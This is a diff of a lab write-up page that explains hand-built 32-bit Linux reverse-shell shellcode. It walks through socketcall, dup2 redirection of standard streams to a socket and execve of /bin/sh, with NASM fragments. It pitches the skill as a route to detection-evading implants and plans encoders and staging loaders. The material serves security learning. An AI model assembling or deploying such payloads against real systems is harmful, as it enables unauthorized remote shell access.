@@ -39,29 +39,104 @@
   <summary><strong>🧵 Want to go deeper? Click here to learn about sockets, syscalls, and what this lab is really doing under the hood.</strong></summary>
   <div style="margin-top: 1em;">
     <h3>🔌 What Is a Socket?</h3>
-    <p>A socket is a low-level abstraction for communication between processes — either on the same machine or across a network. When you call <code>socket()</code> in Linux, you're telling the kernel: "Give me a file descriptor I can use to speak over TCP/IP."</p>
-    <p>In our shellcode, we do this manually using syscalls and syscall numbers. No libc. No wrapper functions. Just bytes.</p>
+    <p>A <strong>socket</strong> is a kernel-backed file descriptor that lets you send and receive data — not just from disk, but across the network. It's like a programmable walkie-talkie that your program can use to talk to another machine (or process) using protocols like TCP/IP.</p>
+    <p>Think of it as a "virtual phone jack" for code: when you <code>socket()</code>, you're asking the OS for a connection point. When you <code>connect()</code>, you're plugging it into someone else's.</p>
 
-    <h3>🧱 How Do We Use It in This Lab?</h3>
+    <h3>🛠️ What Is a Syscall?</h3>
+    <p>A <strong>system call</strong> (syscall) is how user-mode programs talk to the kernel. You can't just directly create sockets, write files, or spawn processes — you must <em>ask the kernel</em> to do it for you.</p>
+    <p>In high-level languages (like C or Python), this is abstracted. But in assembly shellcode, you <em>must</em> invoke syscalls directly using their numeric codes, and pass arguments in a very strict way — typically using registers and stack pointers.</p>
+
+    <h3>🔢 What Are Syscall Numbers?</h3>
+    <p>Every syscall has a number. On 32-bit Linux, these are listed in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> or online. For example:</p>
+    <ul>
+      <li><code>11</code> = <code>execve</code></li>
+      <li><code>63</code> = <code>dup2</code></li>
+      <li><code>102</code> = <code>socketcall</code> (used for <code>socket()</code> and <code>connect()</code> in 32-bit)</li>
+    </ul>
+    <p>To make a syscall in NASM, you load its number into <code>eax</code>, set the arguments in <code>ebx/ecx/edx</code> (or point to them on the stack), and then run <code>int 0x80</code> — which is like knocking on the kernel’s door.</p>
+
+    <h3>📦 How This Lab Uses It</h3>
     <ol>
-      <li><strong>Create a socket:</strong> <code>socket(AF_INET, SOCK_STREAM, 0)</code> means: “I want a TCP socket for IPv4”.</li>
-      <li><strong>Connect to the listener:</strong> We build a <code>sockaddr_in</code> struct on the stack (with IP + port) and call <code>connect()</code>.</li>
-      <li><strong>Redirect stdio:</strong> We use <code>dup2()</code> to copy the socket FD into stdin (0), stdout (1), stderr (2).</li>
-      <li><strong>Spawn shell:</strong> <code>execve("/bin/sh", NULL, NULL)</code> launches a shell that now talks over the socket.</li>
+      <li><strong>Create a socket:</strong> <code>socket(AF_INET, SOCK_STREAM, 0)</code> becomes a <code>socketcall</code> syscall with <code>ebx = 1</code> (subfunction: socket).</li>
+      <li><strong>Connect to target:</strong> <code>connect(sockfd, sockaddr_in*, 16)</code> is another <code>socketcall</code> with <code>ebx = 3</code> (connect subfunction).</li>
+      <li><strong>Redirect I/O:</strong> <code>dup2(sockfd, 0..2)</code> is run three times to route stdin/out/err through the socket.</li>
+      <li><strong>Spawn shell:</strong> <code>execve("/bin/sh", NULL, NULL)</code> creates a shell that now communicates over the socket.</li>
     </ol>
 
-    <h3>🛠️ What Makes This Hard?</h3>
-    <ul>
-      <li>We can’t use C structs — we have to build the sockaddr struct <em>by hand</em> on the stack.</li>
-      <li>All arguments must be passed via pointers on the stack, not registers.</li>
-      <li>We must use the <code>socketcall</code> syscall interface (Linux 32-bit) which multiplexes socket functions.</li>
-      <li>Endianness matters. We must encode IP and port in little-endian format and <code>htons()</code> must be manually applied.</li>
-    </ul>
+    <h3>🧠 Why This Is Powerful</h3>
+    <p>Doing this without any libc, external dependencies, or helper functions means this payload can be injected directly into memory and run anywhere. It doesn’t need to be compiled or linked — it’s <em>pure intent encoded as bytes</em>.</p>
 
-    <h3>📦 Why This Matters for Red Teaming</h3>
-    <p>Manual sockets = manual implants. If you want to build payloads that evade detection, blend in with traffic, or run in stripped-down environments, you must understand networking at the syscall level. This is the kind of muscle that lets you craft <em>real-world</em> implants — not just CTF scripts.</p>
+    <h3>🎯 Real Red Team Takeaway</h3>
+    <p>Most payloads (like those from Metasploit or Cobalt Strike) use similar primitives — but this lab proves you understand how to <em>build them yourself</em>.</p>
+    <p>If you can create a reverse shell from raw syscalls, you can build a loader, a beacon, or a custom implant that can live in memory, evade static analysis, or operate on systems with limited libraries.</p>
+
+    <p><strong>This is low-level mastery in the making.</strong></p>
   </div>
 </details>
+
+<p>That’s the foundation — how shellcode builds up from raw syscalls. Now let’s zoom in on a key syscall that holds it all together in 32-bit land: <code>socketcall</code>.</p>
+
+
+<details>
+  <summary><strong>🧩 Click to learn: How 32-bit Linux bundles networking with <code>socketcall</code></strong></summary>
+  <div style="margin-top: 1em;">
+
+    <h3>📦 What Is socketcall?</h3>
+    <p>On 32-bit Linux systems, most networking syscalls (like <code>socket()</code>, <code>connect()</code>, <code>send()</code>, <code>recv()</code>, etc.) aren’t individual syscalls. Instead, they’re all wrapped inside a single syscall: <code>socketcall</code> (number <code>102</code>).</p>
+
+    <p>This design reduced the number of entries in the syscall table by multiplexing everything through <code>socketcall</code>, using a subcall number to decide the actual operation.</p>
+
+    <h3>🧠 How It Works</h3>
+    <p>To invoke <code>socket()</code> or <code>connect()</code> via <code>socketcall</code>, you need:</p>
+    <ul>
+      <li><code>eax = 102</code> → syscall number for <code>socketcall</code></li>
+      <li><code>ebx = subfunction</code> → e.g. <code>1</code> = <code>socket</code>, <code>3</code> = <code>connect</code></li>
+      <li><code>ecx = pointer to args[]</code> → a pointer to a struct or stack layout of arguments</li>
+    </ul>
+
+    <h4>🧩 Example for <code>socket(AF_INET, SOCK_STREAM, 0)</code></h4>
+    <ul>
+      <li>Push 0 (protocol)</li>
+      <li>Push 1 (SOCK_STREAM)</li>
+      <li>Push 2 (AF_INET)</li>
+    </ul>
+    <p>This becomes the array: <code>[2, 1, 0]</code> pointed to by <code>ecx</code></p>
+    <p>Then:</p>
+    <pre><code class="language-nasm">mov al, 0x66        ; syscall: socketcall
+mov bl, 1           ; subcall: socket
+int 0x80</code></pre>
+
+    <h4>🧩 Example for <code>connect(sockfd, sockaddr*, 16)</code></h4>
+    <ul>
+      <li>Push pointer to sockaddr struct</li>
+      <li>Push length (16)</li>
+      <li>Push socket FD</li>
+    </ul>
+    <p>Also pointed to by <code>ecx</code>, and called with:</p>
+    <pre><code class="language-nasm">mov al, 0x66        ; syscall: socketcall
+mov bl, 3           ; subcall: connect
+int 0x80</code></pre>
+
+    <h3>🦴 Why This Matters for Shellcode</h3>
+    <p>If you’re writing position-independent shellcode for 32-bit Linux, you can’t directly call <code>socket</code> or <code>connect</code> — they don’t have dedicated syscall numbers. You have to go through <code>socketcall</code> and encode the subfunction manually.</p>
+
+    <p>This is why your payload uses <code>mov al, 0x66</code> and <code>mov bl, 1/3</code> — it’s the gateway to networking from assembly.</p>
+
+    <h3>🧠 Pro Tip</h3>
+    <p>On 64-bit Linux, this syscall doesn’t exist — each network function has its own number. That’s why this style of multiplexing is unique to 32-bit shellcode and won’t work unmodified on x86_64.</p>
+
+    <h3>✅ Summary</h3>
+    <ul>
+      <li><strong><code>eax = 102</code></strong> → syscall: <code>socketcall</code></li>
+      <li><strong><code>ebx</code></strong> = subfunction (e.g. 1 = socket, 3 = connect)</li>
+      <li><strong><code>ecx</code></strong> = pointer to args on the stack</li>
+      <li>All network syscalls funnel through this</li>
+    </ul>
+
+    <p><strong>This is how your shellcode talks TCP in 32-bit land.</strong></p>
+  </div>
+</details>
+
 
 
   <h2>🔎 Round One: The "Something’s Off" Phase</h2>
@@ -95,6 +170,36 @@ push eax  ; Correct protocol = 0</code></pre>
   <pre><code class="language-bash">whoami
 # → [REDACTED_USER]</code></pre>
   <p>It worked. For real this time.</p>
+
+  <details>
+  <summary><strong>🔁 Deep Dive: How dup2() Hijacks the Terminal</strong></summary>
+  <div style="margin-top: 1em;">
+    <h3>🧠 What dup2() Actually Does</h3>
+    <p><code>dup2(oldfd, newfd)</code> duplicates a file descriptor so that both point to the same resource (e.g. a socket). When we do:</p>
+    <pre><code class="language-nasm">mov al, 0x3f  ; syscall dup2
+mov ebx, sockfd
+mov ecx, 0    ; or 1, or 2
+int 0x80</code></pre>
+    <p>We’re saying: “make stdin (fd 0), stdout (fd 1), and stderr (fd 2) all point to the socket.”</p>
+    <p>This is **crucial** — otherwise, <code>/bin/sh</code> would launch, but have no way to receive commands or send output. It would silently die, or echo into a void.</p>
+
+    <h3>🎯 Why It’s Looped</h3>
+    <p>Instead of hardcoding 3 separate calls, we loop from fd 0 to 2:</p>
+    <pre><code class="language-nasm">xor ecx, ecx
+.loop:
+  mov al, 0x3f
+  mov ebx, esi   ; our socket fd
+  int 0x80
+  inc ecx
+  cmp ecx, 3
+  jl .loop</code></pre>
+    <p>This makes the shellcode smaller and more elegant. Each <code>dup2()</code> links one std stream to the socket.</p>
+
+    <h3>📡 Result</h3>
+    <p>Once <code>/bin/sh</code> runs, it behaves as if it's running in a normal terminal — but that terminal is now your Netcat socket. Interactive control achieved.</p>
+  </div>
+</details>
+
 
   <h2>💻 Final Shellcode (NASM)</h2>
   <pre><code class="language-nasm">BITS 32
@@ -158,6 +263,38 @@ fail:
 section .data
 msg db "FAIL", 0x0a</code></pre>
 
+<details>
+  <summary><strong>🧬 Deep Dive: How execve() Launches a Shell from Raw Bytes</strong></summary>
+  <div style="margin-top: 1em;">
+    <h3>📂 What execve() Wants</h3>
+    <p>To execute a program like <code>/bin/sh</code>, the kernel needs:</p>
+    <ul>
+      <li><strong>ebx</strong> → Pointer to the string <code>"/bin/sh"</code></li>
+      <li><strong>ecx</strong> → Pointer to argv (list of args)</li>
+      <li><strong>edx</strong> → Pointer to envp (list of env vars)</li>
+    </ul>
+
+    <h3>💡 What We Actually Provide</h3>
+    <p>We push <code>"/bin//sh"</code> as two 32-bit chunks:</p>
+    <pre><code class="language-nasm">push 0x68732f2f
+push 0x6e69622f</code></pre>
+    <p>This gives us a valid null-terminated C string at ESP. Then:</p>
+    <pre><code class="language-nasm">mov ebx, esp</code></pre>
+    <p>We set argv and envp to null pointers:</p>
+    <pre><code class="language-nasm">push eax
+mov ecx, esp   ; argv = [NULL]
+mov edx, eax   ; envp = NULL</code></pre>
+
+    <h3>🧠 Why This Works</h3>
+    <p><code>execve()</code> just needs minimal valid data. A path, and null pointers for the others. That’s enough to launch a bare shell.</p>
+    <p>Since stdin/stdout/stderr are already redirected via <code>dup2()</code>, the shell will work interactively — even over a socket.</p>
+
+    <h3>📦 Result</h3>
+    <p>This code pushes /bin/sh onto the stack, nulls out the parameters, and invokes execve. The kernel handles the rest. It's a minimal, single-step transfer of control into a shell — nothing more than what's strictly required to get interactive command execution.</p>
+  </div>
+</details>
+
+
   <h2>📚 What This Taught Me</h2>
   <p>This lab wasn’t about fancy tricks. It was about <strong>debugging wrong mental models</strong>.</p>
   <blockquote>You can’t brute-force low-level code. You need to look at the bytes.</blockquote>
@@ -183,7 +320,7 @@ msg db "FAIL", 0x0a</code></pre>
 
   <h2>🚀 What’s Next</h2>
   <ul>
-    <li>Deliver via BOF injection (Lab 6!)</li>
+    <li>Deliver via BOF injection (Lab 6?)</li>
     <li>XOR encode with decoder stub</li>
     <li>Pull from network staging loader</li>
     <li>64-bit rebuild + compatibility testing</li>
